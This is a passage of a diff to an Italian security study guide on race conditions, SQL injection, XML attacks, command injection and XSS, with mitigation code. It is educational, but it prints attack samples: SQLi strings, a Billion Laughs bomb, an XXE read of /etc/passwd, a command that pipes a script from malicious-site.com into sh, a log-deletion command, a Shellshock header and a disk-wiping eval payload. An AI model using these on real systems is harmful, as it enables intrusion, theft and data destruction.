+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Dirty COW (CVE-2016-5195) — Elevazione dei privilegi nel kernel Linux</dt>
+    <dd>È una delle vulnerabilità di race condition storicamente più significative e celebri. Sfruttava una condizione di gara implementata a livello di Kernel Linux nella gestione del meccanismo di memoria virtuale <strong>Copy-on-Write (COW)</strong>. Tramite Dirty COW, un utente locale non privilegiato (es. un utente SSH limitato o un container sandboxato) poteva generare una race condition durante la scrittura sul percorso virtuale <code>/proc/self/mem</code> in concomitanza con una system call <code>madvise(MADV_DONTNEED)</code>. Lo sfasamento temporale consentiva di bypassare la convalida dei privilegi di scrittura sul Kernel, permettendo al thread di sovrascrivere file adibiti a sola lettura ad altissimi privilegi (come rimpiazzare o modificare i binari di root in memoria), determinando un'immediata Local Privilege Escalation globale.</dd>
+
+    <dt>Collegamento Simbolico (Symlink Attack)</dt>
+    <dd>Un file temporaneo privilegiato <code>/tmp/temp_log</code> supera il controllo di autorizzazione (TOC). Prima della scrittura (TOU), l'attaccante lo rimpiazza con un symlink che punta a <code>/etc/shadow</code>. L'applicazione, eseguita como utente root, scrive i log sovrascrivendo e distruggendo il file delle password crittografate di sistema.</dd>
+
+    <dt>Doppia Spesa / Doppio Prelievo (Race Condition Finanziaria)</dt>
+    <dd>Un utente lancia simultaneamente due richieste di transazione di addebito di 100€ su un account con saldo residuo di 100€. Entrambi i thread verificano contemporaneamente il saldo (TOC) ed entrambi leggono 100€ disponibili. Entrambi autorizzano il prelievo ed erogano il contante (TOU), consentendo all'utente di accumulare con frode 200€ totali.</dd>
+
+    <dt>Race Condition sul Database</dt>
+    <dd>Un attaccante inietta e sovrascrive un campo provvisorio di transazione di database sfruttando il temporaneo sfasamento di tempo presente tra la validazione dei dati a schermo (TOC) ed il commit definitivo della query sul server SQL (TOU).</dd>
+  </dl>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Le Tecniche di Mitigazione Avanzate</h4>
+  <p>
+    Per proteggersi dalle race condition, gli sviluppatori devono assicurarsi di eliminare qualsiasi finestra d'opportunità con controlli sincronizzati:
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 20px;">
+    <dt>Operazioni Atomiche (Atomics)</dt>
+    <dd>Fondere in via nativa e strutturale la fase di verifica con quella di esecuzione in un'unica istruzione indivisibile a basso livello. Ad esempio, impiegando la macro flag <code>O_CREAT | O_EXCL</code> di apertura dei file si garantisce che il controllo di esistenza e la creazione del file avvengano come un solo blocco logico senza interruzioni di CPU possibili.</dd>
+
+    <dt>Mutex (Mutual Exclusion) e Semafori</dt>
+    <dd>Il <strong>Mutex (Mutual Exclusion / Esclusione mutua)</strong> è un meccanismo software o hardware di locking utilizzato per regolare l'accesso a risorse condivise. Solo il thread che acquisisce positivamente il Mutex (che funziona come un vero e proprio "lucchetto") può entrare nella cosiddetta "sezione critica" del codice ed operare la risorsa. Tutti gli altri thread concorrenti rimangono bloccati in uno stato d'attesa (wait) fino a quando la risorsa originale non svincola ed rilascia ed esce dal Mutex, estirpando così le race window alla radice.</dd>
+
+    <dt>Il Rischio di Stallo: Deadlock</dt>
+    <dd>Un cattivo design nell'uso di Mutex e lock può indurre un altro difetto software grave: il <strong>Deadlock (Stallo)</strong>. Si verifica quando due o più processi concorrenti si arrestano indefinitamente bloccandosi a vicenda, perché ognuno è in attesa del rilascio di un lock detenuto dall'altro (es. il Thread 1 detiene il Mutex A e attende per sbloccare il Mutex B; contemporaneamente il Thread 2 detiene il Mutex B e attende il rilascio del Mutex A). La cura per i deadlock risiede nell'implementare un ordinamento fisso dei lock (locking hierarchy), nell'impiegare acquisti di lock provvisori con timeout (try-lock) o in controllori interni volti a sventare i cicli chiusi (Deadlock Detection).</dd>
+
+    <dt>Utilizzo di File Descriptor / File Handles</dt>
+    <dd>Evitare di manipolare costantemente i file basandoli sulla risoluzione dei loro percorsi testuali o stringhe di cartelle (che il filesystem può deviare tramite symlink). Il programma deve invece prelevare un File Descriptor all'atto dell'apertura iniziale e svolgere qualsiasi operazione solo tramite quell'handle già blindato, neutralizzando i rimpiazzi di directory esterni.</dd>
+
+    <dt>Transazioni con Livelli Isolati (Database Isolation Levels)</dt>
+    <dd>Nel campo dei database, configurare i livelli di isolamento logici corretti (quali <code>Serializable</code> o l'uso di clausole di rigido row locking tipo <code>SELECT ... FOR UPDATE</code>), per sbarrare il prelievo dei record da parte di thread concorrenti prima che la transazione principale giunga a conclusione.</dd>
+  </dl>
 
   <h3 id="malicious-update">Malicious update (Aggiornamento malevolo)</h3>
   <p>
-    Un <strong>malicious update (aggiornamento malevolo)</strong> è un aggiornamento
-    software apparentemente legittimo che contiene o introduce codice malevolo. Può
-    avvenire a diversi livelli: un attaccante che compromette l'infrastruttura di update
-    di un vendor (supply chain attack), un aggiornamento distribuito da un vendor
-    compromesso, o un aggiornamento falso che imita quello del vendor reale. È distinto dal supply chain attack nel senso che riguarda
-    specificamente il meccanismo di aggiornamento, non l'intera catena di fornitura.
+    Un <strong>malicious update (aggiornamento malevolo)</strong> è un aggiornamento software apparentemente legittimo che contiene o introduce codice malevolo. Può avvenire a diversi livelli: un attaccante che compromette l'infrastruttura di update di un vendor (supply chain attack), un aggiornamento distribuito da un vendor compromesso, o un aggiornamento falso che imita quello del vendor reale. È distinto dal supply chain attack nel senso che riguarda specificamente il meccanismo di aggiornamento, non l'intera catena di fornitura.
   </p>
 </section>
 
@@ -194,83 +387,441 @@
 <section id="web-vulns">
   <h2>Vulnerabilità web-based (Web-based Vulnerabilities)</h2>
 
-  <h3 id="sqli">SQL injection (SQLi)</h3>
-  <p>
-    La <strong>SQL injection (SQLi)</strong> è un attacco in cui l'attaccante inserisce
-    comandi SQL malevoli in un campo di input di un'applicazione web che non esegue
-    la validazione dell'input. Se il backend costruisce le query SQL concatenando
-    direttamente l'input dell'utente, l'attaccante può modificare la query originale
-    per: visualizzare dati non autorizzati, modificare o cancellare dati, bypassare
-    l'autenticazione, ed eseguire comandi sul sistema operativo sottostante.
-  </p>
+  <h3 id="sqli">SQL injection (SQLi) e Istruzioni SQL</h3>
+  
+  <div style="margin-bottom: 25px;">
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">1. Cos'è?</h4>
+    <p style="margin-top: 5px; margin-bottom: 15px;">
+      La <strong>SQL injection (SQLi)</strong> è una vulnerabilità in cui l'attaccante "inganna" il database di un'applicazione inserendo comandi SQL malevoli nei campi di input commerciali o barre di ricerca. Se il server costruisce le query SQL semplicemente incollando (concatenando) il testo fornito dall'utente, il database interpreterà quell'input non come un dato passivo (es. un banale nome utente) ma come un comando logico da eseguire.
+    </p>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">2. Come riconoscerlo?</h4>
+    <p style="margin-top: 5px; margin-bottom: 10px;">
+      Si riconosce nel codice o negli scenari d'esame attraverso questi elementi:
+    </p>
+    <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 15px;">
+      <li><strong>Nel codice:</strong> Presenza di comandi SQL costruiti concatenando variabili tramite somme o interpolazioni (es. <code>"SELECT * FROM users WHERE input='" + input + "'"</code>).</li>
+      <li><strong>Nei log o input d'attacco:</strong> Presenza di caratteri speciali come singoli apici (<code>'</code>), virgolette, trattini combinati (<code>--</code> usati per commentare e disattivare il resto della query), e operatori booleani logici (<code>OR 1=1</code>, <code>UNION SELECT</code>).</li>
+      <li><strong>Nei quiz d'esame:</strong> Parole chiave come <em>"Unexpected characters in an input field to query a database"</em> o <em>"Bypassing authentication via input fields"</em>.</li>
+    </ul>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">3. Come evitarlo e correggerlo? (Le tre protezioni chiave spiegate in modo semplice)</h4>
+    <dl class="termlist" style="margin-left: 10px; margin-bottom: 20px;">
+      <dt>Prepared Statements (Query Parametrizzate) — <em>La difesa principale</em></dt>
+      <dd>Consiste nel pre-compilare la struttura logica della query SQL nel database con parametri segnaposto (es. <code>?</code>), inviando l'input dell'utente separatamente in un secondo momento. Il database saprà a priori che l'input racchiuso nel segnaposto deve essere trattato rigorosamente come una stringa letterale passiva: anche se l'aggressore digita <code>' OR '1'='1</code>, il database cercherà un utente avente quel bizzarro nome letterale, neutralizzando del tutto l'attacco logico.</dd>
+
+      <dt>Input Validation (Validazione degli input)</dt>
+      <dd>Prima che i dati arrivino al database, l'applicazione controlla che rispettino formati rigidi (es. se un campo richiede l'età, l'applicazione controlla tramite Whitelist che l'utente inserisca solo cifre numeriche comprese tra 1 e 120, rigettando immediatamente qualsiasi carattere strano o testo SQL).</dd>
+
+      <dt>Principio di Least Privilege (Minimo Privilegio) per l'account DB</dt>
+      <dd>Garantire all'account del database usato dall'applicazione web solo i minimi permessi di lettura/scrittura indispensabili per funzionare (ad esempio, l'app non deve connettersi come utente <code>root</code> o <code>sa</code>, così se un hacker dovesse riuscire a eseguire SQL injection, non potrà comunque distruggere l'intero database o compromettere il sistema operativo).</dd>
+    </dl>
+  </div>
 
   <div class="example-box">
-    <strong>Esempio pratico — SQLi classico</strong><br>
-    Un form di login costruisce la query: <code>SELECT * FROM users WHERE
-    username='[input]' AND password='[input]'</code><br>
+    <strong>Esempio pratico logico — SQLi classico</strong><br>
+    Un form di login costruisce la query: <code>SELECT * FROM users WHERE username='[input]' AND password='[input]'</code><br>
     L'attaccante inserisce come username: <code>' OR '1'='1</code><br>
-    La query diventa: <code>SELECT * FROM users WHERE username='' OR '1'='1'
-    AND password='...'</code><br>
-    Poiché <code>'1'='1'</code> è sempre vero, la query restituisce tutti gli utenti.
-    L'attaccante accede senza password valida.<br>
-    <strong>Mitigazione:</strong> prepared statements (query parametrizzate),
-    input validation, principio del least privilege per l'account DB.
+    La query diventa: <code>SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'</code><br>
+    Poiché <code>'1'='1'</code> è sempre vero, la query restituisce tutti gli utenti. L'attaccante accede senza password valida.
+  </div>
+
+  <div class="example-box" style="margin-top: 20px;">
+    <strong>Istruzioni SQL: Codice Vulnerabile (Concatenazione) vs Codice Sicuro (Prepared Statement)</strong>
+    <p>Di seguito sono riportati i quattro scenari corrispondenti alle istruzioni manipolate dagli hacker:</p>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">1. SELECT (Estrazione Abusiva)</h4>
+    <p style="margin: 4px 0;"><strong>Vulnerabile (Concatenazione stringhe):</strong></p>
+    <pre style="margin-bottom: 15px;"><code>// L'input utente viene incollato direttamente nella query
+let query = "SELECT * FROM users WHERE email = '" + req.query.email + "'";
+db.query(query); // Se l'input è: test@test.com' OR '1'='1, esfiltra tutte le email del DB</code></pre>
+    <p style="margin: 4px 0;"><strong>Sicuro (Prepared Statement / Parametrizzazione):</strong></p>
+    <pre style="margin-bottom: 25px;"><code>// Il database compila prima lo scheletro della query, trattando l'input come stringa inerte
+let query = "SELECT * FROM users WHERE email = ?";
+db.query(query, [req.query.email]);</code></pre>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">2. INSERT (Inserimento account non autorizzati)</h4>
+    <p style="margin: 4px 0;"><strong>Vulnerabile (Concatenazione stringhe):</strong></p>
+    <pre style="margin-bottom: 15px;"><code>// L'attaccante inietta un comando addizionale chiudendo la parentesi tonda
+let query = "INSERT INTO logs (user, message) VALUES ('admin', '" + req.body.message + "')";
+// Se message è: ciao'); INSERT INTO administrators (user, role) VALUES ('hacker', 'admin') --
+// Vengono eseguite due query distinte, registrando un nuovo amministratore escludendo il resto con il commento (--)</code></pre>
+    <p style="margin: 4px 0;"><strong>Sicuro (Prepared Statement / Parametrizzazione):</strong></p>
+    <pre style="margin-bottom: 25px;"><code>let query = "INSERT INTO logs (user, message) VALUES ('admin', ?)";
+db.query(query, [req.body.message]);</code></pre>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">3. UPDATE (Modifica non autorizzata)</h4>
+    <p style="margin: 4px 0;"><strong>Vulnerabile (Concatenazione stringhe):</strong></p>
+    <pre style="margin-bottom: 15px;"><code>// Modifica della bio del profilo utente
+let query = "UPDATE profiles SET bio = '" + req.body.bio + "' WHERE user_id = " + req.user.id;
+// Se bio è: test', is_admin = 1, la query promuove l'utente malevolo ad amministratore della piattaforma!</code></pre>
+    <p style="margin: 4px 0;"><strong>Sicuro (Prepared Statement / Parametrizzazione):</strong></p>
+    <pre style="margin-bottom: 25px;"><code>let query = "UPDATE profiles SET bio = ? WHERE user_id = ?";
+db.query(query, [req.body.bio, req.user.id]);</code></pre>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">4. DELETE (Distruzione o Sabotaggio dei dati)</h4>
+    <p style="margin: 4px 0;"><strong>Vulnerabile (Concatenazione stringhe):</strong></p>
+    <pre style="margin-bottom: 15px;"><code>// Cancellazione di un post specifico
+let query = "DELETE FROM blog_posts WHERE post_id = " + req.query.id;
+// Se id è: 42 OR 1=1, l'operatore 'OR 1=1' evalua a vero per ogni record, portando all'azzeramento della tabella!</code></pre>
+    <p style="margin: 4px 0;"><strong>Sicuro (Prepared Statement / Parametrizzazione):</strong></p>
+    <pre><code>let query = "DELETE FROM blog_posts WHERE post_id = ?";
+db.query(query, [req.query.id]);</code></pre>
   </div>
 
   <div class="exam-tip">
     <strong>EXAM TIP — SQLi: le parole chiave dello scenario</strong><br>
     "Input field to run commands that view or manipulate data" → <strong>SQL injection</strong>. "Unexpected characters to gain unauthorized access to underlying systems"
-    → <strong>SQL injection</strong>. "Database misconfigurations" +
-    exploitation → <strong>SQL injection</strong>.
-    L'applicazione web che permette l'upload di immagini con un processo che genera
-    traffico outbound verso IP a bassa reputazione → web shell deploiata via vulnerabilità
-    di upload, non direttamente SQLi.
+    → <strong>SQL injection</strong>. "Database misconfigurations" + exploitation → <strong>SQL injection</strong>.
+    L'applicazione web che permette l'upload di immagini con un processo che genera traffico outbound verso IP a bassa reputazione → web shell deploiata via vulnerabilità di upload, non direttamente SQLi.
   </div>
 
-  <h3 id="xss">Cross-site scripting (XSS)</h3>
+  <h3 id="xml-vulns">XML Injection, XML Vulnerability & XML Exploitation</h3>
+  
+  <div style="margin-bottom: 25px;">
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">1. Cosa sono?</h4>
+    <p style="margin-top: 5px; margin-bottom: 15px;">
+      L'<strong>XML (eXtensible Markup Language)</strong> è un formato di marcatura usato per inviare, ricevere e configurare dati tra sistemi diversi. Quando un'applicazione accetta file XML o input all'interno di documenti XML senza controllarli, un attaccante può iniettare tag personalizzati o richiamare <strong>entità esterne (XXE - XML External Entity)</strong> o generare strutture nidificate ricorsive che mandano in crash la memoria del server.
+    </p>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">2. Come riconoscerli?</h4>
+    <p style="margin-top: 5px; margin-bottom: 10px;">
+      Si riconoscono nei quiz o nei log da queste caratteristiche:
+    </p>
+    <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 15px;">
+      <li><strong>XML Injection:</strong> Inserimento di tag speciali come <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> per alterare la gerarchia del file XML generato dal server.</li>
+      <li><strong>XXE (XML External Entity):</strong> Presenza della direttiva <code>&lt;!ENTITY xxe SYSTEM "file://..."&gt;</code> all'interno del documento XML, usata per forzare il server a rivelare i suoi file privati (es. <code>/etc/passwd</code>) o effettuare chiamate HTTP interne non autorizzate.</li>
+      <li><strong>XML Bomb (Billion Laughs):</strong> Presenza di definizioni di entità multiple nidificate in modo esponenziale (es. da lol1 a lol9 dove lol9 richiama 10 volte lol8, lol8 richiama 10 volte lol7, ecc.) per esaurire all'istante la RAM e causare il crash immediato del servizio (Denial-of-Service).</li>
+    </ul>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">3. Come evitarli e correggerli?</h4>
+    <dl class="termlist" style="margin-left: 10px; margin-bottom: 20px;">
+      <dt>Disabilitazione delle Entità Esterne (DTD/External Entities) — <em>La difesa principale</em></dt>
+      <dd>La correzione definitiva per XXE e XML Bomb consiste nel configurare la libreria parser di sottomissione XML sul server disattivando del tutto l'elaborazione di dichiarazioni DOCTYPE o DTD esterne. Se disabilitate, il parser ignorerà qualunque tentativo di espansione ricorsiva o lettura di file, leggendolo come semplice testo innocuo.</dd>
+
+      <dt>Sanitizzazione dell'input (Input Scrubbing)</dt>
+      <dd>Filtrare l'input utente per rimuovere o codificare all'istante i metacaratteri ostili come le parentesi angolari <code>&lt;</code>, <code>&gt;</code> e la e commerciale <code>&amp;</code> prima che confluiscano in blocchi XML, impedendo passaggi d'iniezione strutturale.</dd>
+    </dl>
+  </div>
+
+  <div class="example-box">
+    <strong>Esempi Pratici di XML Exploitation</strong>
+    <p>Di seguito vengono mostrati due payload d'attacco caricati dagli hacker, seguiti dalla soluzione di mitigazione nel codice di backend.</p>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">A. Struttura di un XML Bomb (Billion Laughs)</h4>
+    <p style="margin: 4px 0;">Il parser XML tenta di risolvere ciascuna entità richiamando la precedente 10 volte. In questo modo <code>&amp;lol9;</code> genera un miliardo (10<sup>9</sup>) di stampe in memoria:</p>
+    <pre style="margin-bottom: 20px;"><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;
+  &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
+  &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;
+  &lt;!-- ... prosegue ricorsivamente fino a lol9 ... --&gt;
+  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">B. Caricamento Entità esterne (XXE) per esfiltrare file locali</h4>
+    <p style="margin: 4px 0;">L'attaccante inietta un puntatore al filesystem interno del server, e l'applicazione lo stampa nella risposta al client:</p>
+    <pre style="margin-bottom: 20px;"><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE dati [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;utente&gt;
+  &lt;nome&gt;&amp;xxe;&lt;/nome&gt;
+&lt;/utente&gt;</code></pre>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">C. Mitigazione: Configurazione Sicura del Parser (Java/Node)</h4>
+    <p style="margin: 4px 0;">La protezione consiste nel disabilitare del tutto l'elaborazione di dichiarazioni DOCTYPE/DTD esterne e l'uso di entità esterne:</p>
+    <pre><code>// Disabilitazione totale delle entità esterne e del download di schemi esterni
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); 
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);</code></pre>
+  </div>
+
+  <h3 id="code-injection">Code Injection & Vettori di Immissione (Entering arbitrary code)</h3>
   <p>
-    Il <strong>Cross-site scripting (XSS)</strong> è una vulnerabilità che permette
-    a un attaccante di iniettare script malevoli (tipicamente JavaScript) in pagine
-    web visualizzate da altri utenti. A differenza della SQLi (che attacca il database),
-    la XSS attacca il <em>client</em>: il browser della vittima esegue il codice
-    malevolo credendo che provenga dal sito legittimo, permettendo all'attaccante di
-    rubare cookie di sessione, reindirizzare l'utente, modificare il contenuto della
-    pagina, o eseguire azioni per conto della vittima.
+    Mentre SQLi ed XML Injection alterano la struttura di query destinate a database e parser, la <strong>Code Injection (Iniezione di Codice Arbitrario)</strong> si verifica quando un attaccante è in grado di inserire codice relativo al linguaggio di programmazione applicativo (come PHP, Python, JavaScript, Java, o NodeJS) o comandi di sistema operativi all'interno del server in esecuzione.
   </p>
-  <dl class="termlist">
-    <dt>Stored XSS (Persistente)</dt>
-    <dd>Lo script malevolo viene salvato nel database del server (es. in un commento di un forum). Ogni utente che carica la pagina esegue lo script. È la forma più pericolosa perché non richiede ingegneria sociale per ogni vittima.</dd>
-    <dt>Reflected XSS (Non persistente)</dt>
-    <dd>Lo script malevolo è nell'URL della richiesta. Il server lo "riflette" nella risposta. La vittima deve essere indotta a cliccare su un link appositamente costruito (es. via phishing).</dd>
-    <dt>DOM-based XSS</dt>
-    <dd>L'attacco avviene interamente nel browser della vittima: JavaScript legittimo del sito usa parametri dell'URL o dell'ambiente DOM per scrivere contenuto nella pagina, e l'attaccante manipola quei parametri.</dd>
+  <p>
+    Questo errore logico distruttivo dà all'avversario la facoltà di invocare direttamente comandi del sistema operativo locale o di prenderne l'amministrazione nativa aggirando ogni tipo di sandbox o ACL.
+  </p>
+  <p>
+    Gli attaccanti possono far breccia o alterare le risposte inserendo carichi utili arbitrari attraverso molteplici canali o vettori d'immissione (entry vectors):
+  </p>
+  <ul style="margin-left: 20px; line-height: 1.6; margin-top: 10px; margin-bottom: 20px;">
+    <li><strong>Entering data (Immissione diretta di dati)</strong>: Inserimento di comandi o codice malevolo all'interno di normali parametri d'input visuali, campi di ricerca, moduli utente, o barre di indirizzo URL.</li>
+    <li><strong>Modifying cookies (Modifica del payload dei cookie)</strong>: Alterazione diretta dei cookie di sessione memorizzati nel browser HTML. Se il codice server estrae, decodifica o esegue passaggi dinamici usando questi valori reputandoli sicuri a priori, esegue il codice iniettato.</li>
+    <li><strong>Changing POST data (Cambiamento dei dati POST)</strong>: Intercettazione e manipolazione manuale del corpo delle richieste HTTP POST (inviato in background con formati JSON, XML o form-urlencoded) per scavalcare i controlli visivi del browser.</li>
+    <li><strong>Using HTTP headers (Utilizzo di intestazioni HTTP)</strong>: Manipolazione sistematica di parametri di intestazione di rete inclusi dal client, come l'intestazione <code>User-Agent</code>, <code>Referer</code>, <code>Host</code>, o intestazioni personalizzate. Molte applicazioni loggano o elaborano acriticamente questi metadati tramite script o database vulnerabili.</li>
+  </ul>
+
+  <div class="example-box">
+    <strong>Esempio di Code/Command Injection e Analisi dei Vettori</strong>
+    <p>Consideriamo un server Node.js che esegue un test diagnostico di rete eseguendo un comando ping di sistema:</p>
+
+    <strong>Codice Vulnerabile di Backend:</strong>
+    <pre style="margin-bottom: 20px;"><code>const { exec } = require('child_process');
+
+// Riceve l'indirizzo IP ed effettua il ping richiamando direttamente la shell di sistema
+app.get('/ping', (req, res) => {
+  let host = req.query.hostIP;
+  
+  // VULNERABILITÀ: Concatenazione di stringhe passata direttamente a exec()
+  exec("ping -c 1 " + host, (error, stdout, stderr) => {
+    res.send(stdout);
+  });
+});</code></pre>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Come l'hacker sfrutta i diversi "Vettori d'Immissione" per inviare codice:</h4>
+    <dl class="termlist" style="margin-left: 10px; margin-bottom: 20px;">
+      <dt>1. Entering Data (Immissione diretta di dati)</dt>
+      <dd>L'attaccante passa la stringa malevola nel campo host del form o direttamente nell'URL:<br>
+      <code>GET /ping?hostIP=8.8.8.8;+cat+/etc/passwd</code><br>
+      La shell del server esegue prima <code>ping -c 1 8.8.8.8</code> e, grazie al punto e virgola (<code>;</code>), lancia immediatamente <code>cat /etc/passwd</code>, esfiltrando tutti gli utenti di sistema.</dd>
+
+      <dt>2. Modifying Cookies (Modifica dei cookie del browser)</dt>
+      <dd>Se l'applicazione ricava il server DNS su cui eseguire il test da un cookie chiamato <code>preferred_dns</code> senza controllarlo:<br>
+      <code>let host = req.cookies.preferred_dns;</code><br>
+      L'attaccante modifica il cookie locale nel browser mettendo come valore:<br>
+      <code>1.1.1.1; rm /var/log/syslog</code><br>
+      Il backend estrae il cookie modificato ritenendolo sicuro ed esegue il comando distruttivo di cancellazione dei log.</dd>
+
+      <dt>3. Changing POST Data (Modifica del payload POST)</dt>
+      <dd>Se l'operazione avviene tramite modulo POST con JSON, l'attaccante intercetta la richiesta HTTP in background con proxy come Burp Suite bypassando l'input HTML e invia:<br>
+      <code>POST /api/check_network</code> con corpo:<br>
+      <code>{"hostIP": "8.8.8.8 &amp;&amp; wget http://malicious-site.com/backdoor.sh -O - | sh"}</code><br>
+      Il server riceve l'input modificato nel corpo POST ed esegue il download e avvio di una Web Shell.</dd>
+
+      <dt>4. Using HTTP Headers (Uso delle Intestazioni HTTP)</dt>
+      <dd>Se il server logga lo User-Agent o l'host chiamante inserendo i metadati in script automatici:<br>
+      <code>let clientBrowser = req.headers['user-agent'];</code><br>
+      Inviando un'intestazione HTTP User-Agent modificata (es. sfruttando bug storici di shell-parsing come Shellshock):<br>
+      <code>User-Agent: () { :;}; echo "VULNERABILE" &gt; /var/www/html/test.txt</code><br>
+      L'applicazione interpreta le variabili d'ambiente scrivendo silenziosamente una backdoor sul server web.</dd>
+    </dl>
+
+    <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Codice Sicuro (Mitigazione):</h4>
+    <p style="margin: 4px 0;">La soluzione corretta consiste nell'impedire l'invocazione di una shell di sistema, passando i parametri in modo nettamente disgiunto dal comando binario:</p>
+    <pre><code>const { execFile } = require('child_process');
+
+// execFile esegue l'eseguibile 'ping' direttamente. Gli argomenti nel vettore non verranno MAI
+// interpretati come comandi multipli o delimitatori di shell (; &amp;&amp; |), neutralizzando l'iniezione.
+execFile('ping', ['-c', '1', req.query.hostIP], (error, stdout, stderr) => {
+  res.send(stdout);
+});</code></pre>
+  </div>
+
+  <h3 id="code-execution">Esecuzione di Codice: Arbitrary Code Execution (ACE) & Remote Code Execution (RCE)</h3>
+  <p>
+    L'obiettivo ultimo della stragrande maggioranza degli attacchi di iniezione o manipolazione della memoria è l'esecuzione di comandi non autorizzati. Due concetti fondamentali definiti nello studio della sicurezza dei sistemi sono l'<strong>Arbitrary Code Execution (ACE)</strong> e la sua declinazione più pericolosa, il <strong>Remote Code Execution (RCE)</strong>:
+  </p>
+
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>Arbitrary Code Execution (ACE - Esecuzione di Codice Arbitrario)</dt>
+    <dd>
+      È il superamento delle barriere di sicurezza che consente a un attaccante di forzare un'applicazione o un processo vulnerabile a eseguire comandi o codice di sua scelta.
+      <br><strong>• Spiegazione Semplice ed Esempio Reale:</strong> Immaginiamo un programma installato sul PC che serve a calcolare tasse o bilanci. L'applicazione accetta formule matematiche scritte dall'utente e, per brevità di sviluppo, le elabora utilizzando una funzione di interpretazione dinamica nativa come <code>eval()</code>. Un utente malintenzionato, anziché digitare una formula ordinaria come <code>2 + 2</code>, inserisce un comando maligno del linguaggio (es. in Python: <code>__import__('os').system('rmdir /s /q C:\\')</code>). L'applicazione, leggendolo come fosse una formula, lo esegue, dando luogo ad un'esecuzione di codice arbitrario che cancella le cartelle del computer con gli stessi privilegi del programma.
+    </dd>
+
+    <dt>Remote Code Execution (RCE - Esecuzione di Codice in Remoto)</dt>
+    <dd>
+      Rappresenta il culmine distruttivo degli attacchi cyber. È una sottoclasse di ACE in cui l'attaccante riesce a far interpretare ed eseguire il proprio codice dannoso su un computer o server bersaglio <strong>da remoto, tramite una rete (LAN o Internet)</strong>, senza disporre preventivamente di credenziali valide o di un accesso logico/fisico diretto alla console.
+      <br><strong>• Spiegazione Semplice ed Esempio Reale:</strong> Un server web aziendale gestisce le proprie attività registrando i messaggi di log degli utenti remoti in un file di tracciamento o database. Se la libreria di logging utilizzata dal server è affetta da una vulnerabilità (come la famosissima vulnerabilità storica <strong>Log4Shell</strong> in Java), l'attaccante che si trova dall'altra parte del pianeta invia una normale richiesta HTTP contenente una stringa speciale di comando (es. nell'intestazione <code>User-Agent</code>). Il server vulnerabile, ricevendo la stringa, tenta di risolverla scatenando una connessione automatica verso Internet per prelevare un file Java dannoso memorizzato sul server dell'attaccante. Il codice viene caricato ed eseguito istantaneamente in background sul server aziendale, consentendo all'hacker di ottenere il pieno controllo della macchina a distanza in pochissimi secondi.
+    </dd>
   </dl>
 
+  <h3 id="xss">Cross-site scripting (XSS) e Client-side exploitation</h3>
+  <p>
+    Il <strong>Cross-site scripting (XSS)</strong> è una diffusa e pericolosa vulnerabilità che si verifica a causa di una falla di tipo <strong>input validation vulnerability</strong> (mancanza di controlli rigorosi sui dati in ingresso). Essa permette a un utente malevolo di iniettare <strong>malicious code</strong> (codice dannoso, quasi sempre scritto in <strong>JavaScript</strong>) all'interno di un <strong>trusted website (sito web fidato)</strong>, visualizzato poi da altri visitatori ignari.
+  </p>
+  
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">I Concetti Fondamentali: HTML, JavaScript e DOM</h4>
+  <p>
+    Per comprendere appieno il funzionamento di un attacco XSS, occorre distinguere tra codice eseguito sul server e codice eseguito sul browser dell'utente (client-side):
+  </p>
+  <ul style="margin-left: 20px; line-height: 1.6; margin-bottom: 20px;">
+    <li><strong>HTML</strong>: Il linguaggio di markup usato per strutturare i contenuti di qualsiasi pagina web (testi, moduli, immagini, pulsanti).</li>
+    <li><strong>JavaScript e i Client-side scripts</strong>: Script eseguiti direttamente all'interno della sandbox del browser web dell'utente client. JavaScript consente di dinamizzare l'HTML del sito web fidato (es. effettuare calcoli locali, inviare chiamate di background, mostrare popup).</li>
